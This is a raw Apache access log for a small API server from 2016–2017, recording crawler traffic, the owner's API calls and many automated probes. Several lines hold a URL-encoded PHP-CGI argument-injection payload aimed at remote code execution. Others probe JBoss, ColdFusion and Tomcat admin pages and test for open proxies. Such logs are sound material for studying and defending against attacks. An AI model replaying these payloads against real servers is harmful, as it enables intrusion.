63.141.250.156 - - [05/Oct/2016:08:58:59 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.148.240 - - [05/Oct/2016:10:40:34 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
200.178.96.86 - - [05/Oct/2016:11:38:20 -0600] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
200.178.96.86 - - [05/Oct/2016:11:38:20 -0600] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 210 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
200.178.96.86 - - [05/Oct/2016:11:38:20 -0600] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 213 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
200.178.96.86 - - [05/Oct/2016:11:38:21 -0600] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 213 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
200.178.96.86 - - [05/Oct/2016:11:38:21 -0600] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 210 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
180.97.106.37 - - [05/Oct/2016:12:06:28 -0600] "HEAD http://180.163.113.82/check_proxy HTTP/1.1" 404 - "-" "-"
54.84.118.150 - - [05/Oct/2016:13:00:42 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
183.129.160.229 - - [05/Oct/2016:15:34:03 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.129.160.229 - - [05/Oct/2016:15:34:03 -0600] "test" 200 597 "-" "-"
141.212.121.32 - - [05/Oct/2016:18:15:23 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 zgrab/0.x"
185.25.148.240 - - [05/Oct/2016:18:44:23 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.210 - - [05/Oct/2016:19:03:03 -0600] "GET / HTTP/1.0" 200 597 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
212.129.54.164 - - [05/Oct/2016:19:04:19 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
169.56.71.61 - - [05/Oct/2016:20:47:30 -0600] "GET / HTTP/1.0" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
174.120.113.162 - - [06/Oct/2016:02:23:56 -0600] "GET /CFIDE/administrator/ HTTP/1.1" 404 218 "-" "-"
63.141.250.155 - - [06/Oct/2016:03:39:06 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
213.128.81.66 - - [06/Oct/2016:04:52:27 -0600] "GET / HTTP/1.0" 200 597 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
91.196.50.33 - - [06/Oct/2016:05:01:44 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [06/Oct/2016:06:30:34 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
192.187.101.236 - - [06/Oct/2016:06:38:21 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
54.71.10.52 - - [06/Oct/2016:10:44:42 -0600] "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
54.71.10.52 - - [06/Oct/2016:10:44:42 -0600] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
54.71.10.52 - - [06/Oct/2016:10:44:42 -0600] "GET /if%20youve%20had%20a%20dose%20of%20a%20freaky%20ghost HTTP/1.1" 404 235 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
54.71.10.52 - - [06/Oct/2016:10:44:42 -0600] "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 - "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
54.71.10.52 - - [06/Oct/2016:10:44:42 -0600] "GET /status?full=true HTTP/1.1" 404 204 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
185.25.151.159 - - [06/Oct/2016:14:46:32 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
118.144.35.66 - - [06/Oct/2016:16:17:14 -0600] "POST /login.action HTTP/1.1" 404 210 "-" "Mozilla/5.0"
185.25.151.159 - - [06/Oct/2016:19:52:39 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
183.129.160.229 - - [06/Oct/2016:21:32:48 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.129.160.229 - - [06/Oct/2016:21:32:48 -0600] "test" 200 597 "-" "-"
185.25.151.159 - - [06/Oct/2016:23:14:55 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
142.54.174.84 - - [06/Oct/2016:23:20:09 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
189.120.250.45 - - [07/Oct/2016:04:06:49 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
189.120.250.45 - - [07/Oct/2016:04:06:49 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
189.120.250.45 - - [07/Oct/2016:04:06:53 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
198.204.240.222 - - [07/Oct/2016:05:38:28 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
213.128.81.66 - - [07/Oct/2016:05:45:10 -0600] "GET / HTTP/1.0" 200 597 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
69.30.226.221 - - [07/Oct/2016:07:10:43 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [07/Oct/2016:08:07:10 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [07/Oct/2016:09:10:57 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.49.14.190 - - [07/Oct/2016:09:18:01 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:17 -0600] "GET /v1//users/1/boards HTTP/1.1" 200 409 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:32 -0600] "GET /v1//users/1/board/19 HTTP/1.1" 200 326 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:33 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:36 -0600] "GET /v1//users/1/board/19/block/6 HTTP/1.1" 200 587 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:46 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:50 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:50 -0600] "GET /v1//volume/3/book/2 HTTP/1.1" 200 763 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:11:53 -0600] "GET /v1//volume/3/book/2/chapter/3 HTTP/1.1" 200 11810 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [07/Oct/2016:12:12:16 -0600] "GET /v1//users/1/board/19/block/23 HTTP/1.1" 200 1600 "-" "-"
180.76.15.149 - - [07/Oct/2016:13:03:19 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
93.174.93.218 - - [07/Oct/2016:15:26:17 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [07/Oct/2016:15:26:58 -0600] "-" 408 - "-" "-"
212.129.54.164 - - [07/Oct/2016:16:34:16 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
185.25.151.159 - - [07/Oct/2016:18:17:43 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [07/Oct/2016:22:06:41 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
118.144.35.66 - - [07/Oct/2016:22:38:06 -0600] "POST /login.action HTTP/1.1" 404 210 "-" "Mozilla/5.0"
96.57.102.84 - - [07/Oct/2016:23:19:44 -0600] "GET http://members2.mofos.com/members/ HTTP/1.0" 404 206 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
69.30.193.252 - - [07/Oct/2016:23:21:01 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [08/Oct/2016:03:28:00 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
69.30.193.251 - - [08/Oct/2016:08:50:53 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
222.35.18.100 - - [08/Oct/2016:09:04:45 -0600] "GET /manager/html HTTP/1.1" 404 210 "-" "Mozilla/3.0 (compatible; Indy Library)"
222.35.18.100 - - [08/Oct/2016:09:30:21 -0600] "GET /manager/html HTTP/1.1" 404 210 "-" "Mozilla/3.0 (compatible; Indy Library)"
185.25.151.159 - - [08/Oct/2016:10:19:57 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
69.30.193.254 - - [08/Oct/2016:10:29:50 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [08/Oct/2016:12:33:11 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.218 - - [08/Oct/2016:14:19:52 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [08/Oct/2016:14:20:33 -0600] "-" 408 - "-" "-"
96.57.102.84 - - [08/Oct/2016:14:29:35 -0600] "GET http://members2.mofos.com/members/ HTTP/1.0" 404 206 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
96.57.102.84 - - [08/Oct/2016:16:02:02 -0600] "GET http://members2.mofos.com/members/ HTTP/1.0" 404 206 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
174.23.26.123 - - [08/Oct/2016:16:41:43 -0600] "GET / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [08/Oct/2016:16:41:43 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "http://api.gospelblocks.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [08/Oct/2016:16:42:00 -0600] "GET / HTTP/1.1" 200 15 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [08/Oct/2016:16:42:28 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
93.159.230.90 - - [08/Oct/2016:19:16:31 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; FunWebProducts; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2) chromeframe/8.0.552.224"
91.196.50.33 - - [08/Oct/2016:21:36:23 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [08/Oct/2016:21:59:00 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [08/Oct/2016:22:53:27 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.92.127.201 - - [08/Oct/2016:23:34:48 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
180.76.15.137 - - [09/Oct/2016:00:28:46 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.14 - - [09/Oct/2016:00:28:46 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.153 - - [09/Oct/2016:00:30:56 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
142.54.180.68 - - [09/Oct/2016:02:04:29 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [09/Oct/2016:03:47:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
141.212.122.16 - - [09/Oct/2016:05:10:34 -0600] "GET /x HTTP/1.1" 400 226 "-" "Telesphoreo"
167.114.165.243 - - [09/Oct/2016:09:18:20 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
192.187.118.70 - - [09/Oct/2016:10:02:44 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
91.196.50.33 - - [09/Oct/2016:11:28:28 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
174.23.26.123 - - [09/Oct/2016:11:46:35 -0600] "GET /v1 HTTP/1.1" 301 239 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
174.23.26.123 - - [09/Oct/2016:11:46:35 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
174.23.26.123 - - [09/Oct/2016:11:46:35 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "http://api.gospelblocks.com/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
174.23.26.123 - - [09/Oct/2016:11:46:47 -0600] "GET /v1/1 HTTP/1.1" 404 888 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
174.23.26.123 - - [09/Oct/2016:11:46:55 -0600] "GET /v1/volume/1 HTTP/1.1" 200 8519 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
174.23.26.123 - - [09/Oct/2016:11:47:38 -0600] "-" 408 - "-" "-"
174.23.26.123 - - [09/Oct/2016:11:47:38 -0600] "-" 408 - "-" "-"
66.249.88.1 - - [09/Oct/2016:11:50:38 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.88.7 - - [09/Oct/2016:11:50:38 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.6.96 - - [09/Oct/2016:11:50:38 -0600] "GET /v1/ HTTP/1.1" 200 55 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
173.208.150.116 - - [09/Oct/2016:13:49:08 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
::1 - - [23/Mar/2017:12:47:55 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:47:55 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:47:55 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:47:55 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
::1 - - [23/Mar/2017:12:47:55 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) (internal dummy connection)"
